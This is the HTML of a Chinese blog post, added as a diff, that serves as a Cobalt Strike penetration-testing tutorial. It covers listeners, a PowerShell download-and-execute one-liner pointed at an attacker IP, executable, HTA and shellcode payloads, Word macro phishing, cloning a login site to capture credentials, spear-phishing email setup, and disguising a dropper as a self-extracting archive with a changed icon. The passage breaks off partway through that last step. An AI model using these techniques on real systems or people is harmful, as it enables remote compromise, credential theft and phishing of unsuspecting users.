@@ -1,0 +1,1468 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="工具,内网渗透," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="spira1" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Cobalt Strike监听cs里的listener有两个目的：  告诉cs去为任何一种设置建立攻击载荷处理器 通过别名来连接作为参考的处理器和设置信息  在cs中建立一个监听： 点击耳机形状的图标，再点击下方的add按钮，监听设置就是弹出来  cs有两种监听：  Beacon  内置监听器，当在目标机器上执行payload后会反弹一个beacon shell回来， 有三种beacon：http">
+<meta name="keywords" content="工具,内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网三基佬之知根♂知底">
+<meta property="og:url" content="http://eagerseven.cn/2018/04/28/内网三基佬之知根♂知底/index.html">
+<meta property="og:site_name" content="spira1">
+<meta property="og:description" content="Cobalt Strike监听cs里的listener有两个目的：  告诉cs去为任何一种设置建立攻击载荷处理器 通过别名来连接作为参考的处理器和设置信息  在cs中建立一个监听： 点击耳机形状的图标，再点击下方的add按钮，监听设置就是弹出来  cs有两种监听：  Beacon  内置监听器，当在目标机器上执行payload后会反弹一个beacon shell回来， 有三种beacon：http">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqmeouhd0jj30a706umwy.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqmg7rupz8j31al0300si.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqmga2iis7j30bq07tmx0.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqmgc73t85j307q04b742.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqmhoxlswtj31kw0e4q6j.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqnk0p8coaj30ai06z744.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqnkfwmzvqj30g1097gls.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqnkn2pf1ij309w07aglh.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqnkod5or5j31ak0a5jro.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqnkxp0weqj30ar056q2s.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqnl5bjbpgj30ay07iwed.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqnl6ksrgij30f80a00sw.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqnl8vhhttj30am060745.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqnlfmqkmuj30f90ab3ym.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqmxkfo8ztj313z03z3ya.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqmxmak9awj30dr089mx0.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqnlztcsevj30ku0h374d.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqnm1zbkr5j30nm0j10sq.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqnm3307z8j30z10irt9v.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqmy6i24mhj30b908dweb.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqmydudvv5j317704bgle.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqmyeokdu3j31af0lmjsd.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqnyiu8s9ij31ao0sajsj.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqn1arxntvj30f70bf3yc.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqn19x166cj30fk0a6t95.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqnqge41uej30bp05ygli.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqnqj05xbyj30d704zq2y.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqnqjfykatj302r02cdfl.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqnrfoeiebj30cq0axa9z.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqnrihvxfkj30a40ck3yc.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqnrjo6kdfj30a40ckmx0.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqnrkjbtecj30a40ckmx0.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqns1wkjmrj303702vjr5.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqns2gmjgrj30c30j20tb.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqnsdpvn73j30b906omx2.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqo0f5mxhbj30bv02lgld.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqo0fvy92xj30ke052q2t.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqo0w55zmkj31an0ktmxq.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tNc79gy1fqo0xqi85ej30tt0dwmx4.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqo18lif9xj31ao0ks3zd.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqo1iy806xj30iw06odfq.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqo1jun9sfj30cv06vq2r.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqo1laly68j30m60etglo.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqo29acqaxj30q607pa9y.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqo4b687wyj30es032jr6.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fqo6i9cotaj305204kq2p.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fqo6lmjuyfj307902wq2p.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fqo6nva1v7j31am0etgn9.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fqo6ou03d3j30aj04o0sj.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fqo6pofxtjj30co023a9w.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fqovuobxhij307a02yt8h.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fqo7d69aa6j30k709maam.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fqo7ed1z4qj30a306rmwy.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fqoo15jeomj30k7045glp.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fqp0sapxytj30kg0dqwfq.jpg">
+<meta property="og:image" content="https://ws3.sinaimg.cn/large/006tKfTcgy1fqp0vzyozkj3097020t8k.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fqp2z7seobj30fu01ot8l.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fqp4ntk6mbj31a90k90wa.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fqp4ra3dr9j309x01wt8k.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fqp4v79y3lj30oh06ogly.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fqp55kd46oj319c02smxg.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fqp669s4b9j30pa0hidhh.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fqp69rs8qcj30ev04dt8q.jpg">
+<meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcgy1fqp6j3tkr4j31a50fcn4v.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcgy1fqp6hlo5dnj30lg08wglv.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fqp7gn519oj30g10baglj.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fqp7ibb2doj30bz06y3y9.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcgy1fqp7nsm2dsj31aa0fnqam.jpg">
+<meta property="og:image" content="https://ws4.sinaimg.cn/large/006tNc79gy1fqq8gg19m4j30kh049n09.jpg">
+<meta property="og:image" content="https://ws1.sinaimg.cn/large/006tNc79gy1fqq8hhdqwbj30k202q0uj.jpg">
+<meta property="og:updated_time" content="2018-10-31T11:54:03.510Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内网三基佬之知根♂知底">
+<meta name="twitter:description" content="Cobalt Strike监听cs里的listener有两个目的：  告诉cs去为任何一种设置建立攻击载荷处理器 通过别名来连接作为参考的处理器和设置信息  在cs中建立一个监听： 点击耳机形状的图标，再点击下方的add按钮，监听设置就是弹出来  cs有两种监听：  Beacon  内置监听器，当在目标机器上执行payload后会反弹一个beacon shell回来， 有三种beacon：http">
+<meta name="twitter:image" content="https://ws2.sinaimg.cn/large/006tNc79gy1fqmeouhd0jj30a706umwy.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://eagerseven.cn/2018/04/28/内网三基佬之知根♂知底/"/>
+
+
+
+
+
+  <title>内网三基佬之知根♂知底 | spira1</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<script type="text/javascript" src="/lib/clipboard/clipboard.js"></script>
+<script type="text/javascript" src="/js/src/custom.js"></script>
+
+
+
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+
+
+
+<div id="hexo-helper-live2d">
+  <canvas id="live2dcanvas" width="150" height="300"></canvas>
+</div>
+<style>
+  #live2dcanvas{
+    position: fixed;
+    width: 150px;
+    height: 300px;
+    opacity:0.7;
+    right: 0px;
+    z-index: 999;
+    pointer-events: none;
+    bottom: -20px;
+  }
+</style>
+<script type="text/javascript" src="/live2d/device.min.js"></script>
+<script type="text/javascript">
+const loadScript = function loadScript(c,b){var a=document.createElement("script");a.type="text/javascript";"undefined"!=typeof b&&(a.readyState?a.onreadystatechange=function(){if("loaded"==a.readyState||"complete"==a.readyState)a.onreadystatechange=null,b()}:a.onload=function(){b()});a.src=c;document.body.appendChild(a)};
+(function(){
+  if((typeof(device) != 'undefined') && (device.mobile())){
+    var trElement = document.getElementById('hexo-helper-live2d');
+    trElement.parentNode.removeChild(trElement);
+    return;
+  }else
+    if (typeof(device) === 'undefined') console.error('Cannot find current-device script.');
+  loadScript("/live2d/script.js", function(){loadlive2d("live2dcanvas", "/live2d/assets/hijiki.model.json", 0.5);});
+})();
+</script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">spira1</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-music"></i> <br />
+            
+            Music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://eagerseven.cn/2018/04/28/内网三基佬之知根♂知底/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="spira1">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="spira1">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内网三基佬之知根♂知底</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-28T15:45:00+08:00">
+                2018-04-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2,798
+                </span>
+              
+
+              
+
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Cobalt-Strike"><a href="#Cobalt-Strike" class="headerlink" title="Cobalt Strike"></a>Cobalt Strike</h2><h3 id="监听"><a href="#监听" class="headerlink" title="监听"></a>监听</h3><p>cs里的listener有两个目的：</p>
+<ul>
+<li>告诉cs去为任何一种设置建立攻击载荷处理器</li>
+<li>通过别名来连接作为参考的处理器和设置信息</li>
+</ul>
+<p>在cs中建立一个监听：</p>
+<p>点击耳机形状的图标，再点击下方的<code>add</code>按钮，监听设置就是弹出来</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqmeouhd0jj30a706umwy.jpg" alt=""></p>
+<p>cs有两种监听：</p>
+<ul>
+<li>Beacon</li>
+</ul>
+<p>内置监听器，当在目标机器上执行payload后会反弹一个beacon shell回来，</p>
+<p>有三种beacon：http(s)、dns、smb</p>
+<ul>
+<li>Foreign</li>
+</ul>
+<p>外部监听器，这个监听器仅仅是给攻击载荷处理器（可以是cs，也可以是msf）提供一个别名</p>
+<p>有三种foreign：http(s)、dns、tcp</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqmg7rupz8j31al0300si.jpg" alt=""></p>
+<p>这样就设置好了一个监听，我们可以在本地尝试一下</p>
+<p>在<code>attacks</code>模块里的<code>web drive-by</code>，选择<code>scripted web delivery</code></p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqmga2iis7j30bq07tmx0.jpg" alt=""></p>
+<p>这是用来执行powershell单条指令，用来获取目标机器上的beacon</p>
+<p>点击<code>launch</code>我们发现自动生成了一条powershell命令</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqmgc73t85j307q04b742.jpg" alt=""></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://192.168.120.132:80/a'))"</span></span><br></pre></td></tr></table></figure>
+<p>将这段代码在有powershell的windows上运行后，cs就会返回一个beacon</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqmhoxlswtj31kw0e4q6j.jpg" alt=""></p>
+<p>最后一个选项last为一个持续时间，每60秒会发送一次请求</p>
+<p>不过需要注意的是，这个不免杀，我在本地测试的时候，火绒报毒，其他杀软估计也差不多</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>在目标机器上执行payload后，目标机器会自动去下载beacon shell代码并运行，然后返回目标系统的beancon shell</p>
+<p>创建payload在<code>attacks</code>模块中<code>packages</code>的<code>windows executable</code>中</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqnk0p8coaj30ai06z744.jpg" alt=""></p>
+<p>将生成的payload放到目标机器上执行即可返回一个beacon shell</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqnkfwmzvqj30g1097gls.jpg" alt=""></p>
+<h3 id="客户端攻击"><a href="#客户端攻击" class="headerlink" title="客户端攻击"></a>客户端攻击</h3><p>在<code>attacks</code>模块中<code>web drive-by</code>的<code>system profiler</code>下</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqnkn2pf1ij309w07aglh.jpg" alt=""></p>
+<p>配置好后在目标机器上访问连接即可查看到系统的一些信息，例如系统版本，浏览器版本等</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqnkod5or5j31ak0a5jro.jpg" alt=""></p>
+<h3 id="hta-文件下载"><a href="#hta-文件下载" class="headerlink" title="hta+文件下载"></a>hta+文件下载</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>先创建一个hta payload，然后利用下载模块将这个payload放进下载的文件中，运行即可返回一个beacon shell</p>
+<h4 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h4><p>先生成一个hta payload，payload有三种：executable、powershell、vba，可执行文件exe和宏vba没那么容易命中，还是选择powershell来搞更容易一点</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqnkxp0weqj30ar056q2s.jpg" alt=""></p>
+<p>将生成的hta文件放入下载模块中，下载模块在<code>attacks</code>中<code>web drive-by</code>的<code>host file</code>下</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqnl5bjbpgj30ay07iwed.jpg" alt=""></p>
+<p>然后在目标机器上访问连接执行就能返回一个beacon shell，前提是该机器能执行powershell</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqnl6ksrgij30f80a00sw.jpg" alt=""></p>
+<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>cs还可以生成基于各种语言的shellcode，在<code>attacks</code>中<code>packages</code>的<code>payload ganerator</code>下</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqnl8vhhttj30am060745.jpg" alt=""></p>
+<p>包括c、c#、com scriptlet、java、perl、powershell、powershell command、python、raw、ruby、veil、vba</p>
+<p>以powershell为例，<code>generate</code>后会生成一个ps1脚本，运行这个脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass -command &quot;$&#123;import-module &apos;c:\users\administrator\desktop\payload.ps1&apos;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqnlfmqkmuj30f90ab3ym.jpg" alt=""></p>
+<p>但是执行这个脚本后会一直有一个cmd框，需要手动关闭</p>
+<h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><h4 id="word宏钓鱼"><a href="#word宏钓鱼" class="headerlink" title="word宏钓鱼"></a>word宏钓鱼</h4><p>首先建立一个监听</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqmxkfo8ztj313z03z3ya.jpg" alt=""></p>
+<p>然后在<code>attacks</code>模块下利用<code>packages</code>的<code>ms office macro</code>，选择好刚建立的监听，此时宏就建立好了</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqmxmak9awj30dr089mx0.jpg" alt=""></p>
+<p>点击<code>copy macro</code>复制宏，然后创建一个word或excel文档</p>
+<p>进入<code>视图</code>=&gt;<code>宏</code>=&gt;<code>创建</code></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqnlztcsevj30ku0h374d.jpg" alt=""></p>
+<p>接着在目标机打开office，进入<code>文件</code>=&gt;<code>选项</code>=&gt;<code>信任中心</code>=&gt;<code>信任中心设置</code>，启用宏和信任访问，因为默认这是关闭的，所以这个钓鱼方式其实比较鸡肋</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqnm1zbkr5j30nm0j10sq.jpg" alt=""></p>
+<p>此时在目标机打开这个word文档，即可返回一个shell</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqnm3307z8j30z10irt9v.jpg" alt=""></p>
+<h4 id="克隆网站钓鱼"><a href="#克隆网站钓鱼" class="headerlink" title="克隆网站钓鱼"></a>克隆网站钓鱼</h4><p>在<code>attacks</code>模块中<code>web drive-by</code>的<code>clone site</code></p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqmy6i24mhj30b908dweb.jpg" alt=""></p>
+<p>填入相应的地址，设置好选项就能clone整个网站进行钓鱼了</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqmydudvv5j317704bgle.jpg" alt=""></p>
+<p>此时在浏览器访问地址就能看到一个一摸一样的钓鱼网站</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqmyeokdu3j31af0lmjsd.jpg" alt=""></p>
+<p>并且在点击登录后，会跳转到正常的登录页面，并验证账户密码是否正确</p>
+<p>此时在<code>web log</code>处就能看到记录到的账号密码</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqnyiu8s9ij31ao0sajsj.jpg" alt=""></p>
+<p>当然也可以在克隆网站时，在attack框里加入payload，比如hta文件等，或者用msf生成</p>
+<h4 id="钓鱼邮件钓鱼"><a href="#钓鱼邮件钓鱼" class="headerlink" title="钓鱼邮件钓鱼"></a>钓鱼邮件钓鱼</h4><p>钓鱼邮件模块在<code>attacks</code>中的<code>spear phish</code>中</p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqn1arxntvj30f70bf3yc.jpg" alt=""></p>
+<table>
+<thead>
+<tr>
+<th>模块</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>targets</td>
+<td>要发送邮件的目标邮箱</td>
+</tr>
+<tr>
+<td>template</td>
+<td>发送的邮箱模版，一个eml文件，可以直接在邮箱中导出</td>
+</tr>
+<tr>
+<td>attachment</td>
+<td>放入弄好的word文件</td>
+</tr>
+<tr>
+<td>embed server</td>
+<td>搭建好的钓鱼站</td>
+</tr>
+<tr>
+<td>mail server</td>
+<td>邮件服务器</td>
+</tr>
+<tr>
+<td>bounce to</td>
+<td>模仿发件人</td>
+</tr>
+</tbody>
+</table>
+<p>发送的截图：</p>
+<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1fqn19x166cj30fk0a6t95.jpg" alt=""></p>
+<h3 id="向正常的exe文件中插入payload"><a href="#向正常的exe文件中插入payload" class="headerlink" title="向正常的exe文件中插入payload"></a>向正常的exe文件中插入payload</h3><p>这个模块在<code>attacks</code>中<code>packages</code>的<code>windows dropper</code>下</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqnqge41uej30bp05ygli.jpg" alt=""></p>
+<p><code>embedded file</code>是被插入payload的exe文件</p>
+<p>在目标机器上运行生成的文件即可返回一个shell</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqnqj05xbyj30d704zq2y.jpg" alt=""></p>
+<p>但是生成的文件不太可能让别人随意点击</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqnqjfykatj302r02cdfl.jpg" alt=""></p>
+<p>那么我们来改变一下图标和名字</p>
+<p>首先把文件改名，然后压缩<code>添加到压缩文件</code></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqnrfoeiebj30cq0axa9z.jpg" alt=""></p>
+<p>接着设置压缩方式为<code>存储</code>，解压选项为<code>创建自解压格式压缩文件</code></p>
+<p>然后进入<code>高级</code>，点击<code>自解压选项</code>，在<code>设置</code>的<code>安装程序</code>框中填入文件名字</p>
+<p><img src="https://ws1.sinaimg.cn/large/006tNc79gy1fqnrihvxfkj30a40ck3yc.jpg" alt=""></p>
+<p>然后进入<code>模式</code>，勾选<code>解包到临时文件夹</code>和<code>全部隐藏</code></p>
+<p><img src="https://ws4.sinaimg.cn/large/006tNc79gy1fqnrjo6kdfj30a40ckmx0.jpg" alt=""></p>
+<p>接着再进入<code>更新</code>，勾选<code>覆盖所有文件</code></p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNc79gy1fqnrkjbtecj30a40ckmx0.jpg" alt=""></p>
+<p>最后进入<code>文本和图标</code>，在<code>从文件加载自解压文件图标</code>处选择一个文件的图标</p>
